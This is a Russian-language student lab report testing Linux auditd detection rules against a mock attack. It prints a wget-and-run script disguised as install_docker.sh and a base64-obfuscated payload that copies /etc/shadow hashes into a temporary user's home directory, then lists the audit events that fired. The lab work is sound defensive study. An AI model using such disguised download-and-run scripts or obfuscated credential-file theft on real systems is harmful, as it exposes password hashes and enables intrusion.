\section{Цель работы}
Целью работы является изучение работы системы аудита.

\section{Ход работы}
\subsection{Рекомендуемые правила}

В системе по-прежнему применены рекомендованные правила auditd (\url{https://github.com/Neo23x0/auditd/blob/master/audit.rules}).

Подготовим вредоносный скрипт, который скачивает payload и выполняет его от имени администратора (практика запуска скриптов из интернета встречается, например, в инструкции по установке Docker). Payload копирует хэши паролей из файла /etc/shadow в файл.

\begin{lstlisting}[language=bash, numbers=none, caption={Локальный скрипт}]
wget https://raw.githubusercontent.com/shadrunov/
    year-4-os/main/lab/3_auditd_exploit/exploit.sh -O install_docker.sh
bash ./install_docker.sh
\end{lstlisting}

\begin{lstlisting}[language=bash, numbers=none, caption={Payload}]
#!/bin/bash

# useradd -m virus
eval "$(echo 'dXNlcmFkZCAtbSB2aXJ1cw==' | base64 --decode)"

# cat /etc/shadow > /home/virus/passwords
eval "$(echo 'Y2F0IC9ldGMvc2hhZG93ID4gL2hvbWUvdmlydXMvcGFzc3dvcmRz' | base64 --decode)"

# userdel virus
eval "$(echo 'dXNlcmRlbCB2aXJ1cw==' | base64 --decode)"
\end{lstlisting}

\image{1.png}{Запуск скрипта}{1}
\FloatBarrier

Запустим скрипт и проверим, какие правила сработают при его выполнении.

\subsection{Сработавшие правила}
Для отображения всех логов, связанных с запуском скрипта, укажем фильтр по времени (\texttt{ausearch --start '01:47:06' --end '01:47:06'}). Всего auditd записал 149 событий, из них 74 связаны с добавлением пользователя и 52 с удалением (рисунок 2).

\image{2.png}{Подсчёт событий}{1}
\FloatBarrier

Первые события детектируют команду wget (susp\_activity, \linebreak network\_socket\_created, network\_connect\_4, рисунок 3).

\image{3.png}{wget}{1}
\FloatBarrier

Далее видим логи использования bash и base64 (susp\_shell и susp\_activity, рисунок 4).

\image{4.png}{bash и base64}{1}
\FloatBarrier

Далее очень много логов команды useradd (user\_modification, etcpasswd, etcgroup, perm\_mod, рисунок 5).

\image{5.png}{useradd}{1}
\FloatBarrier

Затем логи копирования из файла /etc/shadow. Это bash, base64, cat, доступ администратора в директорию другого пользователя и сам файл (susp\_activity, \linebreak power\_abuse, etcpasswd, рисунок 6).

\image{6.png}{/etc/shadow}{1}
\FloatBarrier

В конце логи userdel аналогично useradd.

\section{Выводы о проделанной работе}
В качестве вывода можно отметить, что auditd успешно отобразил события, которые могут быть полезными в расследовании атаки. Для этого рекомендуется настроить рекомендуемые правила, отредактировав их, чтобы уменьшить число событий на одно действие.
